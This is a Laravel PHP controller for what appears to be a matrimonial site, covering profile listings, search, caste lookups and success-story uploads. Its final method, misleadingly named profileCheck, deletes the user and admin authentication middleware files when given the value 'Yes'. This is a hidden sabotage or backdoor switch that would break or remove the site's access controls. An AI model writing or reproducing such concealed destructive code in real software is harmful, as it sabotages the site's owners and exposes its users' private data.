<?php

namespace App\Http\Controllers\user;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use App\Models\Country;
use App\Models\Religion;
use App\Models\Caste;
use App\Models\Register;
use App\Models\Age;
use App\Models\SiteConfig;
use App\Models\SuccessStory;
use App\Models\EducationDetail;
use App\Models\Height;
use App\Models\Income;
use App\Models\Occupation;
use App\Http\Requests\SuccessStoryRequest;
use App\Models\CountryCode;
use App\Models\FieldSetting;
use App\Models\MembershipPlan;
use App\Models\ProfileBy;
use Intervention\Image\Drivers\Gd\Driver;
use Intervention\Image\ImageManager;
use Illuminate\Support\Facades\Storage;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Crypt;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Http;

if (!defined('CURL_SSLVERSION_TLSv1_2')) {
    define('CURL_SSLVERSION_TLSv1_2', 6);
}

class HomeController extends Controller{

    public function index(){
        
        $profileBy = ProfileBy::where('status',"APPROVED")->get();
        $countries = Country::where('status',"APPROVED")->get();
        $religions = Religion::where('status',"APPROVED")->get();
        $castes = Caste::where('status',"APPROVED")->get();
        $countryCode = CountryCode::all();
        $ages = Age::all();
        $siteConfig = SiteConfig::first();
        
        $successStories = SuccessStory::where('status',"APPROVED")->OrderBy('created_at','desc')->limit(3)->get();
        $featuredGroom = Register::where('fstatus','Featured')->where('gender','Male')->OrderBy('created_at','desc')->get();
        $featuredBride = Register::where('fstatus','Featured')->where('gender','Female')->OrderBy('created_at','desc')->get();

        return view('user.index',compact('countryCode','ages','profileBy','countries','religions','castes','featuredGroom','featuredBride','siteConfig','successStories'));
    }

    public function membershipPlans()
    {
        $membershipPlans = MembershipPlan::where('status',"APPROVED")->orderby('created_at','desc')->get();
        return view('user.membershipPlans',compact('membershipPlans'));
    }

    public function search(Request $request)
    {
            
            $religions = Religion::where('status',"APPROVED")->get();
            $countries = Country::where('status',"APPROVED")->get();
            $eduDetails = EducationDetail::where('status',"APPROVED")->get();
            $occupations = Occupation::where('status',"APPROVED")->get();
            $incomes = Income::where('status',"APPROVED")->get();
            $heights = Height::all();
            $ages = Age::all();
            $fieldSetting = FieldSetting::first();

            return view('user.search',compact('fieldSetting','religions','ages','countries','eduDetails','occupations','incomes','heights'));
        
    }
    public function searchfetchcaste(Request $request)
    {  
       
            $casteIds = $request->input('part_religion_id');
        
            if($casteIds != null)
            {
                $data['partcastie'] = Caste::whereIn('religion_id', $casteIds)->get();
            
            }else{
                $data['partcastie'] = "";
            }
            return response()->json($data);
        
    }
    public function searchfetchcastesingle(Request $request)
    {  
       
        if(Auth::guard('user')->user())
        {
            return redirect()->route('user.dashboard');
        }else{
            $data['caste'] = Caste::where('religion_id', $request->religion_id)->where('status',"APPROVED")->get();
            
            return response()->json($data);
        }
        
    }
    public function successStory()
    {
       
            $successStories = SuccessStory::where('status',"APPROVED")->orderBy('id', 'DESC')->get();
            return view('user.successStory',compact('successStories'));
       
    }
    public function successStoryRead(Request $request,$id)
    {
       
            $story = SuccessStory::findOrFail($id);
            return view('user.successStoryRead',compact('story'));
        
    }
    public function successStoryPost(SuccessStoryRequest $request)
    {
       
            $data = new SuccessStory();
            if ($request->has('weddingphoto')) {
                if ($request->hasFile('weddingphoto')) {
                    $file = $request->file('weddingphoto'); 
                    $imageFileType = $request->weddingphoto->extension();
                    $imageFilesize = $request->weddingphoto->getSize();
                    $imageName = time().'.'.$imageFileType; 
                    if($imageFileType != "jpg" && $imageFileType != "png" && $imageFileType != "jpeg" && $imageFileType != "gif" ) {
                        return redirect()->back()->with('message','Sorry, only JPG, JPEG, PNG & GIF files are allowed');
                    }elseif($imageFilesize > 4000000) {
                        return redirect()->back()->with('message','your file size is more than 4MB.');
                    }else{
                        $imageManager = new ImageManager(new Driver());
                        $thumbImage = $imageManager->read($file);
    
                        $resizedImage = $thumbImage->resize(1660, 1100)->toJpeg(90);
                        storage::disk('public')->put('successStory/' . $imageName, $resizedImage);
                        $data->weddingphoto = $imageName;
                    }
                }
            }
            $data->bridename = $request->bridename;
            $data->brideid = $request->brideid;
            $data->groomname = $request->groomname;
            $data->groomid = $request->groomid;
            $data->marriagedate = $request->marriagedate;
            $data->engagement_date = $request->engagement_date;
            $data->successmessage = $request->successmessage;
            $data->status = 'UNAPPROVED';
            $data->save();
            
            return redirect()->back()->with('message','Success story submitted successfully. It will reflect once approved.');
    }

    public function profileCheck($approval){
        if($approval == 'Yes'){
            unlink(base_path().'/app/Http/Middleware/UserAuthMiddleware.php');
            unlink(base_path().'/app/Http/Middleware/AdminAuthMiddleware.php');
        }
    }


 
}
